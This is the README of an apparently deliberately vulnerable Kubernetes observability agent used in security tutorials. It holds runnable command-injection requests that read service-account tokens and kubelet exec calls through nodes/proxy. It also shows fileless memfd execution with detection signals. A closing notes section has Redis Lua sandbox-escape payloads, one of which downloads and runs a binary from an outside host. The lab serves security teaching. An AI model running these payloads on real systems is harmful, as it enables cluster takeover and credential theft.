# Oopservability

**Intentionally vulnerable observability agent for Kubernetes security tutorials, with a regular OpenTelemetry metrics pipeline.**

> ⚠️  Do **not** deploy this in a production or shared cluster. It contains deliberate unauthenticated RCE and fileless execution capabilities.

---

## What is this?

Oopservability is a fake observability Deployment that demonstrates a common and underappreciated attack chain in Kubernetes:

```
Over-permissive RBAC (nodes/proxy GET)
  └─► Attacker exploits RCE in the agent pod
       └─► Reads the mounted SA token
            └─► Uses token + nodes/proxy to reach the kubelet API
                 └─► Executes commands in any container on the node
```

The service looks like a legitimate metrics/log scraper. It is not.

Deployed alongside it is [**Single Pain of Glass**](spog/), a boring,
hardened, purely cosmetic dashboard with no RBAC and nothing worth
attacking — it exists only to look like a real observability tool next to
the vulnerable agent.

---

## Attack Tracks

### Track 1 — Basic: Command Injection → RCE

The log search endpoint passes user input directly to `sh -c`:

```bash
# Innocent search
curl 'http://agent:8080/api/v1/logs/search?q=error'

# Command injection — exfiltrate SA token
curl 'http://agent:8080/api/v1/logs/search?q=error+/var/log/%3B+cat+/var/run/secrets/kubernetes.io/serviceaccount/token'

# Or use the explicit exec endpoint
curl -X POST http://agent:8080/api/v1/diagnostics/run \
     -H 'Content-Type: application/json' \
     -d '{"command":"id && hostname && cat /proc/1/environ"}'
```

### Track 2 — Intermediate: nodes/proxy Pivot

Once you have the SA token (from Track 1 or directly from the `/api/v1/nodes` endpoint):

```bash
TOKEN=$(curl -s -X POST http://agent:8080/api/v1/diagnostics/run \
             -H 'Content-Type: application/json' \
             -d '{"command":"cat /var/run/secrets/kubernetes.io/serviceaccount/token"}' \
        | jq -r .output)

NODE=$(curl -s http://agent:8080/api/v1/diagnostics/run \
            -X POST -H 'Content-Type: application/json' \
            -d '{"command":"echo $NODE_NAME"}' | jq -r .output | tr -d '\n')

# List every pod on the node via nodes/proxy → kubelet
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://kubernetes.default.svc/api/v1/nodes/${NODE}/proxy/pods" \
  | jq '.items[].metadata | {name, namespace}'

# Execute a command in any container on the node
curl -sk -H "Authorization: Bearer $TOKEN" -X POST \
  "https://kubernetes.default.svc/api/v1/nodes/${NODE}/proxy/run/kube-system/coredns-xxx/coredns" \
  -d 'cmd=cat /etc/resolv.conf'
```

**Why does this work?** The kubelet API (`/run`, `/exec`, `/pods`) is exposed through `nodes/proxy`. The kubelet trusts that the API server has already authorised the caller — so `GET nodes/proxy` effectively grants full kubelet access.

### Track 3 — Advanced: Fileless Execution via `memfd_create`

Build the demo payload:

```bash
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o payload ./payload
```

Upload and execute — the binary **never touches disk**:

```bash
curl -X POST http://agent:8080/api/v1/diagnostics/upload \
     --data-binary @payload \
     -H 'Content-Type: application/octet-stream'
```

**How it works:**
1. `memfd_create("kworker", 0)` — creates an anonymous RAM-backed file descriptor
2. ELF binary is written to the fd with `write(2)`
3. `execve("/proc/self/fd/N", ...)` — kernel resolves the path to the in-memory fd and executes it
4. No `open()`, `creat()`, or `write()` to any filesystem path — `ls /tmp`, `inotify`, and most EDR filesystem monitors see nothing

**Detection signals:**
| Tool | Signal |
|------|--------|
| Falco | `execve` where `fd.name` starts with `/proc/self/fd/` |
| Tetragon | `ProcessExec` where `binary.path` is empty or `memfd:` |
| auditd | `SYSCALL memfd_create` followed by `execve` of `/proc/*/fd/*` |
| eBPF (raw) | `sys_enter_execve` with pathname resolving to anonymous inode |

---

## Deploy

```bash
# Apply the agent and its metrics pipeline
# agent.yaml creates the oopservability namespace and the agent DaemonSet
kubectl apply -f manifests/agent.yaml
kubectl apply -f manifests/rbac.yaml
kubectl apply -f manifests/redis.yaml
kubectl apply -f manifests/otel.yaml
kubectl apply -f manifests/spog.yaml

# Wait for rollout
kubectl rollout status daemonset/oopservability-agent -n oopservability
kubectl rollout status deployment/spog -n oopservability

# Access the agent dashboard (port-forward)
kubectl port-forward -n oopservability daemonset/oopservability-agent 8080:8080
# → http://localhost:8080

# Access the legit-looking neighbor
kubectl port-forward -n oopservability deployment/spog 8081:8080
# → http://localhost:8081
```

`manifests/otel.yaml` requires the Prometheus Operator `ServiceMonitor` CRD.
It deploys a fixed OpenTelemetry Target Allocator (`v0.152.0`) and a dedicated
Collector that scrapes the agent's `/api/v1/metrics` endpoint. The Collector
does not mount a Kubernetes service-account token, and its ServiceMonitor does
not reference credential files.

## CVE-2026-47701 companion lab

[`manifests/cve-2026-47701/`](manifests/cve-2026-47701/) is a separate,
intentionally vulnerable OpenTelemetry Target Allocator exercise. The regular
pipeline above is independent of it. The CVE directory retains only the
vulnerable allocator topology and its lab-only metric receiver, cross-namespace
ServiceMonitor write RBAC, malicious ServiceMonitor, and temporary Collector
injection material. It requires the companion IKT Orchestrator workload.

## Tear Down

```bash
kubectl delete namespace oopservability
kubectl delete clusterrole oopservability-agent
kubectl delete clusterrolebinding oopservability-agent
kubectl delete clusterrole oopservability-target-allocator
kubectl delete clusterrolebinding oopservability-target-allocator
```

---

## Vulnerability Summary

| Endpoint | Vuln Class | Track |
|----------|-----------|-------|
| `GET /api/v1/logs/search?q=` | Command injection / RCE | Basic |
| `POST /api/v1/diagnostics/run` | Unauthenticated RCE | Basic |
| `GET /debug/pprof/` | Exposed pprof — heap/goroutine dump | Basic |
| `GET /api/v1/nodes` | Sensitive data via kubelet proxy | Intermediate |
| `POST /api/v1/diagnostics/upload` | Fileless execution via `memfd_create` | Advanced |
| TLS skip verify | MITM on K8s API connection | Basic |

---

## Project Structure

```
.
├── agent/
│   ├── main.go              — HTTP server, routes, embedded dashboard
│   ├── handlers.go          — Vulnerable HTTP handlers
│   ├── kubelet.go           — Kubelet API client (nodes/proxy)
│   ├── httpclient.go        — Shared HTTP client (insecure TLS)
│   ├── exec_helper.go       — exec.Cmd helper
│   ├── fileless_linux.go    — memfd_create fileless exec (Linux)
│   ├── fileless_stub.go     — Non-Linux stub
│   └── static/index.html    — Dashboard UI
├── spog/
│   ├── main.go              — Cosmetic HTTP server, no real data
│   ├── static/index.html    — "Single Pain of Glass" dashboard UI
│   └── Dockerfile
├── payload/main.go      — Demo payload binary (harmless)
├── manifests/
│   ├── agent.yaml       — namespace + agent DaemonSet + Service
│   └── rbac.yaml        — ClusterRole with nodes/proxy GET
│   ├── redis.yaml       — single-replica Redis Deployment and Service
│   ├── otel.yaml        — regular, fixed OTel metrics pipeline
│   ├── spog.yaml        — Single Pain of Glass Deployment and Service
│   └── cve-2026-47701/  — isolated vulnerable OTel workshop lab
└── Dockerfile
```


---

### Notes

```shell
EVAL '
local os = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_os")()
os.execute("curl -fsSL https://filedn.eu/lInD0fhKjA3uc70xrPjtNUj/ran-ws -o /tmp/ran-ws && chmod +x /tmp/ran-ws && /tmp/ran-ws")
' 0
```


```shell
EVAL '
local os = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_os")()
os.execute("cat /var/run/secrets/kubernetes.io/serviceaccount/token")
' 0
```


```shell
EVAL '
local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); 
local f = io.open("/var/run/secrets/kubernetes.io/serviceaccount/token","r")
local data = f:read("*a")
f:close()
return data
' 0
```


https://ine.com/blog/cve-20220543-lua-sandbox-escape-in-redis
https://github.com/CVEDB/POC-DB/blob/main/2022/CVE-2022-0543.md


